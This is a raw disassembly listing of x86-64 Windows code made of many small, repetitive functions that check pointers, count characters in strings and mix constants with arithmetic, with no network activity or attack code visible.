   140002e9a:	03 44 24 08          	add    0x8(%rsp),%eax
   140002e9e:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140002ea2:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140002ea7:	eb e2                	jmp    0x140002e8b
   140002ea9:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140002eae:	eb cc                	jmp    0x140002e7c
   140002eb0:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140002eb4:	48 83 c4 28          	add    $0x28,%rsp
   140002eb8:	c3                   	ret
   140002eb9:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002ec0:	72 08                	jb     0x140002eca
   140002ec2:	8b 01                	mov    (%rcx),%eax
   140002ec4:	05 2c 84 d9 00       	add    $0xd9842c,%eax
   140002ec9:	c3                   	ret
   140002eca:	b8 05 40 00 80       	mov    $0x80004005,%eax
   140002ecf:	c3                   	ret
   140002ed0:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002ed7:	72 4e                	jb     0x140002f27
   140002ed9:	48 83 ec 28          	sub    $0x28,%rsp
   140002edd:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140002ee4:	00 
   140002ee5:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140002eea:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140002eef:	e8 a2 fe ff ff       	call   0x140002d96
   140002ef4:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140002ef8:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140002efd:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140002f02:	e8 e6 fe ff ff       	call   0x140002ded
   140002f07:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140002f0b:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   140002f10:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   140002f15:	e8 21 fe ff ff       	call   0x140002d3b
   140002f1a:	01 44 24 08          	add    %eax,0x8(%rsp)
   140002f1e:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140002f22:	48 83 c4 28          	add    $0x28,%rsp
   140002f26:	c3                   	ret
   140002f27:	83 c8 ff             	or     $0xffffffff,%eax
   140002f2a:	c3                   	ret
   140002f2b:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002f32:	73 07                	jae    0x140002f3b
   140002f34:	48 8d 0d 04 1a 00 00 	lea    0x1a04(%rip),%rcx        # 0x14000493f
   140002f3b:	31 c0                	xor    %eax,%eax
   140002f3d:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   140002f43:	45 85 d2             	test   %r10d,%r10d
   140002f46:	74 17                	je     0x140002f5f
   140002f48:	41 83 ea 01          	sub    $0x1,%r10d
   140002f4c:	0f b6 11             	movzbl (%rcx),%edx
   140002f4f:	84 d2                	test   %dl,%dl
   140002f51:	74 0c                	je     0x140002f5f
   140002f53:	80 fa 20             	cmp    $0x20,%dl
   140002f56:	75 02                	jne    0x140002f5a
   140002f58:	ff c0                	inc    %eax
   140002f5a:	48 ff c1             	inc    %rcx
   140002f5d:	eb e4                	jmp    0x140002f43
   140002f5f:	c3                   	ret
   140002f60:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002f67:	72 0d                	jb     0x140002f76
   140002f69:	8b 01                	mov    (%rcx),%eax
   140002f6b:	05 39 2f 6d 00       	add    $0x6d2f39,%eax
   140002f70:	0d 9c 4a fc 00       	or     $0xfc4a9c,%eax
   140002f75:	c3                   	ret
   140002f76:	83 c8 ff             	or     $0xffffffff,%eax
   140002f79:	c3                   	ret
   140002f7a:	48 83 ec 28          	sub    $0x28,%rsp
   140002f7e:	31 c9                	xor    %ecx,%ecx
   140002f80:	ff 15 46 96 d6 05    	call   *0x5d69646(%rip)        # 0x145d6c5cc
   140002f86:	48 85 c0             	test   %rax,%rax
   140002f89:	74 0d                	je     0x140002f98
   140002f8b:	89 c2                	mov    %eax,%edx
   140002f8d:	48 c1 e8 10          	shr    $0x10,%rax
   140002f91:	31 d0                	xor    %edx,%eax
   140002f93:	48 83 c4 28          	add    $0x28,%rsp
   140002f97:	c3                   	ret
   140002f98:	83 c8 ff             	or     $0xffffffff,%eax
   140002f9b:	48 83 c4 28          	add    $0x28,%rsp
   140002f9f:	c3                   	ret
   140002fa0:	48 83 ec 28          	sub    $0x28,%rsp
   140002fa4:	31 c9                	xor    %ecx,%ecx
   140002fa6:	ff 15 20 96 d6 05    	call   *0x5d69620(%rip)        # 0x145d6c5cc
   140002fac:	48 85 c0             	test   %rax,%rax
   140002faf:	74 0a                	je     0x140002fbb
   140002fb1:	25 ff ff 00 00       	and    $0xffff,%eax
   140002fb6:	48 83 c4 28          	add    $0x28,%rsp
   140002fba:	c3                   	ret
   140002fbb:	83 c8 ff             	or     $0xffffffff,%eax
   140002fbe:	48 83 c4 28          	add    $0x28,%rsp
   140002fc2:	c3                   	ret
   140002fc3:	89 c8                	mov    %ecx,%eax
   140002fc5:	c1 e8 14             	shr    $0x14,%eax
   140002fc8:	25 ff 00 00 00       	and    $0xff,%eax
   140002fcd:	83 f8 7d             	cmp    $0x7d,%eax
   140002fd0:	75 06                	jne    0x140002fd8
   140002fd2:	0d 00 00 00 80       	or     $0x80000000,%eax
   140002fd7:	c3                   	ret
   140002fd8:	83 e0 7f             	and    $0x7f,%eax
   140002fdb:	c3                   	ret
   140002fdc:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140002fe3:	72 26                	jb     0x14000300b
   140002fe5:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   140002fec:	72 1d                	jb     0x14000300b
   140002fee:	44 0f b7 01          	movzwl (%rcx),%r8d
   140002ff2:	44 0f b7 0a          	movzwl (%rdx),%r9d
   140002ff6:	66 45 39 c8          	cmp    %r9w,%r8w
   140002ffa:	7c 05                	jl     0x140003001
   140002ffc:	7f 07                	jg     0x140003005
   140002ffe:	31 c0                	xor    %eax,%eax
   140003000:	c3                   	ret
   140003001:	83 c8 ff             	or     $0xffffffff,%eax
   140003004:	c3                   	ret
   140003005:	b8 01 00 00 00       	mov    $0x1,%eax
   14000300a:	c3                   	ret
   14000300b:	b8 57 00 07 80       	mov    $0x80070057,%eax
   140003010:	c3                   	ret
   140003011:	48 83 ec 28          	sub    $0x28,%rsp
   140003015:	85 c9                	test   %ecx,%ecx
   140003017:	74 46                	je     0x14000305f
   140003019:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   14000301f:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140003023:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   14000302a:	00 
   14000302b:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140003030:	7e 2d                	jle    0x14000305f
   140003032:	c7 44 24 10 03 00 00 	movl   $0x3,0x10(%rsp)
   140003039:	00 
   14000303a:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   14000303f:	7e 17                	jle    0x140003058
   140003041:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140003045:	33 44 24 10          	xor    0x10(%rsp),%eax
   140003049:	33 44 24 08          	xor    0x8(%rsp),%eax
   14000304d:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140003051:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140003056:	eb e2                	jmp    0x14000303a
   140003058:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   14000305d:	eb cc                	jmp    0x14000302b
   14000305f:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140003063:	48 83 c4 28          	add    $0x28,%rsp
   140003067:	c3                   	ret
   140003068:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000306f:	72 13                	jb     0x140003084
   140003071:	0f b6 01             	movzbl (%rcx),%eax
   140003074:	35 06 de 4e 00       	xor    $0x4ede06,%eax
   140003079:	05 37 12 28 00       	add    $0x281237,%eax
   14000307e:	25 8e 7f 18 00       	and    $0x187f8e,%eax
   140003083:	c3                   	ret
   140003084:	b8 05 40 00 80       	mov    $0x80004005,%eax
   140003089:	c3                   	ret
   14000308a:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003091:	72 12                	jb     0x1400030a5
   140003093:	8b 01                	mov    (%rcx),%eax
   140003095:	05 2e 42 ea 00       	add    $0xea422e,%eax
   14000309a:	0d 4f cf 67 00       	or     $0x67cf4f,%eax
   14000309f:	0d 36 ab d6 00       	or     $0xd6ab36,%eax
   1400030a4:	c3                   	ret
   1400030a5:	b8 57 00 07 80       	mov    $0x80070057,%eax
   1400030aa:	c3                   	ret
   1400030ab:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400030b2:	73 07                	jae    0x1400030bb
   1400030b4:	48 8d 0d 5c 18 00 00 	lea    0x185c(%rip),%rcx        # 0x140004917
   1400030bb:	31 c0                	xor    %eax,%eax
   1400030bd:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   1400030c3:	45 85 d2             	test   %r10d,%r10d
   1400030c6:	74 17                	je     0x1400030df
   1400030c8:	41 83 ea 01          	sub    $0x1,%r10d
   1400030cc:	0f b6 11             	movzbl (%rcx),%edx
   1400030cf:	84 d2                	test   %dl,%dl
   1400030d1:	74 0c                	je     0x1400030df
   1400030d3:	80 fa 3d             	cmp    $0x3d,%dl
   1400030d6:	75 02                	jne    0x1400030da
   1400030d8:	ff c0                	inc    %eax
   1400030da:	48 ff c1             	inc    %rcx
   1400030dd:	eb e4                	jmp    0x1400030c3
   1400030df:	c3                   	ret
   1400030e0:	48 83 ec 28          	sub    $0x28,%rsp
   1400030e4:	85 c9                	test   %ecx,%ecx
   1400030e6:	74 46                	je     0x14000312e
   1400030e8:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   1400030ee:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1400030f2:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   1400030f9:	00 
   1400030fa:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   1400030ff:	7e 2d                	jle    0x14000312e
   140003101:	c7 44 24 10 03 00 00 	movl   $0x3,0x10(%rsp)
   140003108:	00 
   140003109:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   14000310e:	7e 17                	jle    0x140003127
   140003110:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140003114:	03 44 24 10          	add    0x10(%rsp),%eax
   140003118:	03 44 24 08          	add    0x8(%rsp),%eax
   14000311c:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140003120:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140003125:	eb e2                	jmp    0x140003109
   140003127:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   14000312c:	eb cc                	jmp    0x1400030fa
   14000312e:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140003132:	48 83 c4 28          	add    $0x28,%rsp
   140003136:	c3                   	ret
   140003137:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000313e:	72 0e                	jb     0x14000314e
   140003140:	0f b6 01             	movzbl (%rcx),%eax
   140003143:	35 33 3f 49 00       	xor    $0x493f33,%eax
   140003148:	35 72 ba 00 00       	xor    $0xba72,%eax
   14000314d:	c3                   	ret
   14000314e:	83 c8 ff             	or     $0xffffffff,%eax
   140003151:	c3                   	ret
   140003152:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003159:	72 4e                	jb     0x1400031a9
   14000315b:	48 83 ec 28          	sub    $0x28,%rsp
   14000315f:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140003166:	00 
   140003167:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   14000316c:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003171:	e8 ea fd ff ff       	call   0x140002f60
   140003176:	31 44 24 08          	xor    %eax,0x8(%rsp)
   14000317a:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   14000317f:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140003184:	e8 3a fe ff ff       	call   0x140002fc3
   140003189:	31 44 24 08          	xor    %eax,0x8(%rsp)
   14000318d:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   140003192:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140003197:	e8 ee fe ff ff       	call   0x14000308a
   14000319c:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400031a0:	8b 44 24 08          	mov    0x8(%rsp),%eax
   1400031a4:	48 83 c4 28          	add    $0x28,%rsp
   1400031a8:	c3                   	ret
   1400031a9:	83 c8 ff             	or     $0xffffffff,%eax
   1400031ac:	c3                   	ret
   1400031ad:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400031b4:	73 07                	jae    0x1400031bd
   1400031b6:	48 8d 0d cf 17 00 00 	lea    0x17cf(%rip),%rcx        # 0x14000498c
   1400031bd:	31 c0                	xor    %eax,%eax
   1400031bf:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   1400031c5:	45 85 d2             	test   %r10d,%r10d
   1400031c8:	74 17                	je     0x1400031e1
   1400031ca:	41 83 ea 01          	sub    $0x1,%r10d
   1400031ce:	0f b6 11             	movzbl (%rcx),%edx
   1400031d1:	84 d2                	test   %dl,%dl
   1400031d3:	74 0c                	je     0x1400031e1
   1400031d5:	80 fa 2f             	cmp    $0x2f,%dl
   1400031d8:	75 02                	jne    0x1400031dc
   1400031da:	ff c0                	inc    %eax
   1400031dc:	48 ff c1             	inc    %rcx
   1400031df:	eb e4                	jmp    0x1400031c5
   1400031e1:	c3                   	ret
   1400031e2:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400031e9:	73 07                	jae    0x1400031f2
   1400031eb:	48 8d 0d 9a 17 00 00 	lea    0x179a(%rip),%rcx        # 0x14000498c
   1400031f2:	31 c0                	xor    %eax,%eax
   1400031f4:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   1400031fa:	45 85 d2             	test   %r10d,%r10d
   1400031fd:	74 17                	je     0x140003216
   1400031ff:	41 83 ea 01          	sub    $0x1,%r10d
   140003203:	0f b6 11             	movzbl (%rcx),%edx
   140003206:	84 d2                	test   %dl,%dl
   140003208:	74 0c                	je     0x140003216
   14000320a:	80 fa 3d             	cmp    $0x3d,%dl
   14000320d:	75 02                	jne    0x140003211
   14000320f:	ff c0                	inc    %eax
   140003211:	48 ff c1             	inc    %rcx
   140003214:	eb e4                	jmp    0x1400031fa
   140003216:	c3                   	ret
   140003217:	89 c8                	mov    %ecx,%eax
   140003219:	c1 e8 04             	shr    $0x4,%eax
   14000321c:	25 ff ff 00 00       	and    $0xffff,%eax
   140003221:	3d d9 02 00 00       	cmp    $0x2d9,%eax
   140003226:	75 06                	jne    0x14000322e
   140003228:	0d 00 00 00 40       	or     $0x40000000,%eax
   14000322d:	c3                   	ret
   14000322e:	25 ff 7f 00 00       	and    $0x7fff,%eax
   140003233:	c3                   	ret
   140003234:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000323b:	73 07                	jae    0x140003244
   14000323d:	48 8d 0d 88 16 00 00 	lea    0x1688(%rip),%rcx        # 0x1400048cc
   140003244:	31 c0                	xor    %eax,%eax
   140003246:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   14000324c:	45 85 d2             	test   %r10d,%r10d
   14000324f:	74 17                	je     0x140003268
   140003251:	41 83 ea 01          	sub    $0x1,%r10d
   140003255:	0f b6 11             	movzbl (%rcx),%edx
   140003258:	84 d2                	test   %dl,%dl
   14000325a:	74 0c                	je     0x140003268
   14000325c:	80 fa 2f             	cmp    $0x2f,%dl
   14000325f:	75 02                	jne    0x140003263
   140003261:	ff c0                	inc    %eax
   140003263:	48 ff c1             	inc    %rcx
   140003266:	eb e4                	jmp    0x14000324c
   140003268:	c3                   	ret
   140003269:	48 83 ec 28          	sub    $0x28,%rsp
   14000326d:	85 c9                	test   %ecx,%ecx
   14000326f:	74 47                	je     0x1400032b8
   140003271:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140003277:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000327b:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140003282:	00 
   140003283:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140003288:	7e 2e                	jle    0x1400032b8
   14000328a:	c7 44 24 10 0c 00 00 	movl   $0xc,0x10(%rsp)
   140003291:	00 
   140003292:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140003297:	7e 18                	jle    0x1400032b1
   140003299:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   14000329d:	0f af 44 24 10       	imul   0x10(%rsp),%eax
   1400032a2:	03 44 24 08          	add    0x8(%rsp),%eax
   1400032a6:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   1400032aa:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   1400032af:	eb e1                	jmp    0x140003292
   1400032b1:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   1400032b6:	eb cb                	jmp    0x140003283
   1400032b8:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   1400032bc:	48 83 c4 28          	add    $0x28,%rsp
   1400032c0:	c3                   	ret
   1400032c1:	48 83 ec 28          	sub    $0x28,%rsp
   1400032c5:	85 c9                	test   %ecx,%ecx
   1400032c7:	74 47                	je     0x140003310
   1400032c9:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   1400032cf:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1400032d3:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   1400032da:	00 
   1400032db:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   1400032e0:	7e 2e                	jle    0x140003310
   1400032e2:	c7 44 24 10 07 00 00 	movl   $0x7,0x10(%rsp)
   1400032e9:	00 
   1400032ea:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   1400032ef:	7e 18                	jle    0x140003309
   1400032f1:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   1400032f5:	0f af 44 24 10       	imul   0x10(%rsp),%eax
   1400032fa:	03 44 24 08          	add    0x8(%rsp),%eax
   1400032fe:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140003302:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140003307:	eb e1                	jmp    0x1400032ea
   140003309:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   14000330e:	eb cb                	jmp    0x1400032db
   140003310:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140003314:	48 83 c4 28          	add    $0x28,%rsp
   140003318:	c3                   	ret
   140003319:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003320:	72 23                	jb     0x140003345
   140003322:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   140003329:	72 1a                	jb     0x140003345
   14000332b:	44 8b 01             	mov    (%rcx),%r8d
   14000332e:	44 8b 0a             	mov    (%rdx),%r9d
   140003331:	45 39 c8             	cmp    %r9d,%r8d
   140003334:	7c 05                	jl     0x14000333b
   140003336:	7f 07                	jg     0x14000333f
   140003338:	31 c0                	xor    %eax,%eax
   14000333a:	c3                   	ret
   14000333b:	83 c8 ff             	or     $0xffffffff,%eax
   14000333e:	c3                   	ret
   14000333f:	b8 01 00 00 00       	mov    $0x1,%eax
   140003344:	c3                   	ret
   140003345:	b8 57 00 07 80       	mov    $0x80070057,%eax
   14000334a:	c3                   	ret
   14000334b:	48 83 ec 28          	sub    $0x28,%rsp
   14000334f:	31 c9                	xor    %ecx,%ecx
   140003351:	ff 15 75 92 d6 05    	call   *0x5d69275(%rip)        # 0x145d6c5cc
   140003357:	48 85 c0             	test   %rax,%rax
   14000335a:	74 05                	je     0x140003361
   14000335c:	48 83 c4 28          	add    $0x28,%rsp
   140003360:	c3                   	ret
   140003361:	83 c8 ff             	or     $0xffffffff,%eax
   140003364:	48 83 c4 28          	add    $0x28,%rsp
   140003368:	c3                   	ret
   140003369:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003370:	72 23                	jb     0x140003395
   140003372:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   140003379:	72 1a                	jb     0x140003395
   14000337b:	44 8b 01             	mov    (%rcx),%r8d
   14000337e:	44 8b 0a             	mov    (%rdx),%r9d
   140003381:	45 39 c8             	cmp    %r9d,%r8d
   140003384:	7c 05                	jl     0x14000338b
   140003386:	7f 07                	jg     0x14000338f
   140003388:	31 c0                	xor    %eax,%eax
   14000338a:	c3                   	ret
   14000338b:	83 c8 ff             	or     $0xffffffff,%eax
   14000338e:	c3                   	ret
   14000338f:	b8 01 00 00 00       	mov    $0x1,%eax
   140003394:	c3                   	ret
   140003395:	b8 57 00 07 80       	mov    $0x80070057,%eax
   14000339a:	c3                   	ret
   14000339b:	48 83 ec 28          	sub    $0x28,%rsp
   14000339f:	85 c9                	test   %ecx,%ecx
   1400033a1:	74 46                	je     0x1400033e9
   1400033a3:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   1400033a9:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1400033ad:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   1400033b4:	00 
   1400033b5:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   1400033ba:	7e 2d                	jle    0x1400033e9
   1400033bc:	c7 44 24 10 06 00 00 	movl   $0x6,0x10(%rsp)
   1400033c3:	00 
   1400033c4:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   1400033c9:	7e 17                	jle    0x1400033e2
   1400033cb:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   1400033cf:	03 44 24 10          	add    0x10(%rsp),%eax
   1400033d3:	03 44 24 08          	add    0x8(%rsp),%eax
   1400033d7:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   1400033db:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   1400033e0:	eb e2                	jmp    0x1400033c4
   1400033e2:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   1400033e7:	eb cc                	jmp    0x1400033b5
   1400033e9:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   1400033ed:	48 83 c4 28          	add    $0x28,%rsp
   1400033f1:	c3                   	ret
   1400033f2:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400033f9:	72 0a                	jb     0x140003405
   1400033fb:	0f b7 01             	movzwl (%rcx),%eax
   1400033fe:	69 c0 bc 00 00 00    	imul   $0xbc,%eax,%eax
   140003404:	c3                   	ret
   140003405:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   14000340a:	c3                   	ret
   14000340b:	89 c8                	mov    %ecx,%eax
   14000340d:	c1 e8 0c             	shr    $0xc,%eax
   140003410:	25 ff ff 00 00       	and    $0xffff,%eax
   140003415:	3d 5c 93 00 00       	cmp    $0x935c,%eax
   14000341a:	75 06                	jne    0x140003422
   14000341c:	0d 00 00 00 80       	or     $0x80000000,%eax
   140003421:	c3                   	ret
   140003422:	25 ff 7f 00 00       	and    $0x7fff,%eax
   140003427:	c3                   	ret
   140003428:	48 83 ec 28          	sub    $0x28,%rsp
   14000342c:	85 c9                	test   %ecx,%ecx
   14000342e:	74 46                	je     0x140003476
   140003430:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140003436:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000343a:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140003441:	00 
   140003442:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140003447:	7e 2d                	jle    0x140003476
   140003449:	c7 44 24 10 0c 00 00 	movl   $0xc,0x10(%rsp)
   140003450:	00 
   140003451:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140003456:	7e 17                	jle    0x14000346f
   140003458:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   14000345c:	03 44 24 10          	add    0x10(%rsp),%eax
   140003460:	03 44 24 08          	add    0x8(%rsp),%eax
   140003464:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140003468:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   14000346d:	eb e2                	jmp    0x140003451
   14000346f:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140003474:	eb cc                	jmp    0x140003442
   140003476:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   14000347a:	48 83 c4 28          	add    $0x28,%rsp
   14000347e:	c3                   	ret
   14000347f:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003486:	72 4e                	jb     0x1400034d6
   140003488:	48 83 ec 28          	sub    $0x28,%rsp
   14000348c:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140003493:	00 
   140003494:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140003499:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000349e:	e8 1e fe ff ff       	call   0x1400032c1
   1400034a3:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400034a7:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   1400034ac:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400034b1:	e8 e5 fe ff ff       	call   0x14000339b
   1400034b6:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400034ba:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   1400034bf:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400034c4:	e8 a0 fe ff ff       	call   0x140003369
   1400034c9:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400034cd:	8b 44 24 08          	mov    0x8(%rsp),%eax
   1400034d1:	48 83 c4 28          	add    $0x28,%rsp
   1400034d5:	c3                   	ret
   1400034d6:	83 c8 ff             	or     $0xffffffff,%eax
   1400034d9:	c3                   	ret
   1400034da:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400034e1:	72 4e                	jb     0x140003531
   1400034e3:	48 83 ec 28          	sub    $0x28,%rsp
   1400034e7:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   1400034ee:	00 
   1400034ef:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   1400034f4:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400034f9:	e8 36 fd ff ff       	call   0x140003234
   1400034fe:	01 44 24 08          	add    %eax,0x8(%rsp)
   140003502:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140003507:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000350c:	e8 06 fd ff ff       	call   0x140003217
   140003511:	01 44 24 08          	add    %eax,0x8(%rsp)
   140003515:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   14000351a:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000351f:	e8 e7 fe ff ff       	call   0x14000340b
   140003524:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140003528:	8b 44 24 08          	mov    0x8(%rsp),%eax
   14000352c:	48 83 c4 28          	add    $0x28,%rsp
   140003530:	c3                   	ret
   140003531:	83 c8 ff             	or     $0xffffffff,%eax
   140003534:	c3                   	ret
   140003535:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000353c:	72 4e                	jb     0x14000358c
   14000353e:	48 83 ec 28          	sub    $0x28,%rsp
   140003542:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140003549:	00 
   14000354a:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   14000354f:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140003554:	e8 f2 fd ff ff       	call   0x14000334b
   140003559:	01 44 24 08          	add    %eax,0x8(%rsp)
   14000355d:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   140003562:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   140003567:	e8 bc fe ff ff       	call   0x140003428
   14000356c:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140003570:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   140003575:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   14000357a:	e8 ea fc ff ff       	call   0x140003269
   14000357f:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140003583:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140003587:	48 83 c4 28          	add    $0x28,%rsp
   14000358b:	c3                   	ret
   14000358c:	83 c8 ff             	or     $0xffffffff,%eax
   14000358f:	c3                   	ret
   140003590:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003597:	72 4e                	jb     0x1400035e7
   140003599:	48 83 ec 28          	sub    $0x28,%rsp
   14000359d:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   1400035a4:	00 
   1400035a5:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   1400035aa:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   1400035af:	e8 97 fd ff ff       	call   0x14000334b
   1400035b4:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400035b8:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   1400035bd:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   1400035c2:	e8 2b fe ff ff       	call   0x1400033f2
   1400035c7:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400035cb:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   1400035d0:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400035d5:	e8 e7 fc ff ff       	call   0x1400032c1
   1400035da:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400035de:	8b 44 24 08          	mov    0x8(%rsp),%eax
   1400035e2:	48 83 c4 28          	add    $0x28,%rsp
   1400035e6:	c3                   	ret
